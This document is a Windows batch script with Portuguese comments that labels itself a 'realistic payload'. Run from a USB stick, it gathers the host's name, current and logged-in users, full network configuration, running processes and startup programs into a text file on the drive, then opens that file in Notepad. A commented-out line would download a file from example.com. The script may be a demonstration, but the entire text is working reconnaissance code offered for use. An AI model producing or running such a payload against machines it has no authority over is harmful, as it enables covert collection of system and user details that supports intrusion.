@echo off
REM Payload realista: coleta informações do sistema e salva no pendrive
setlocal enabledelayedexpansion
set OUTFILE="%~dp0info_recolhida.txt"

echo ==== INFORMAÇÕES DO SISTEMA ==== > %OUTFILE%
echo Data/Hora: %DATE% %TIME% >> %OUTFILE%
echo Hostname: %COMPUTERNAME% >> %OUTFILE%
echo Usuário atual: %USERNAME% >> %OUTFILE%
echo Diretório atual: %CD% >> %OUTFILE%
echo. >> %OUTFILE%

echo ==== USUÁRIOS LOGADOS ==== >> %OUTFILE%
query user >> %OUTFILE% 2>&1
echo. >> %OUTFILE%

echo ==== IP E REDE ==== >> %OUTFILE%
ipconfig /all >> %OUTFILE% 2>&1
echo. >> %OUTFILE%

echo ==== PROCESSOS ATIVOS ==== >> %OUTFILE%
tasklist >> %OUTFILE% 2>&1
echo. >> %OUTFILE%

echo ==== PROGRAMAS INICIADOS COM O WINDOWS ==== >> %OUTFILE%
wmic startup get caption,command >> %OUTFILE% 2>&1
echo. >> %OUTFILE%

REM (Opcional) Baixar arquivo de teste
REM powershell -Command "Invoke-WebRequest -Uri 'https://example.com/teste.txt' -OutFile '%~dp0baixado.txt'"

REM Abrir o arquivo coletado
start notepad.exe %OUTFILE%
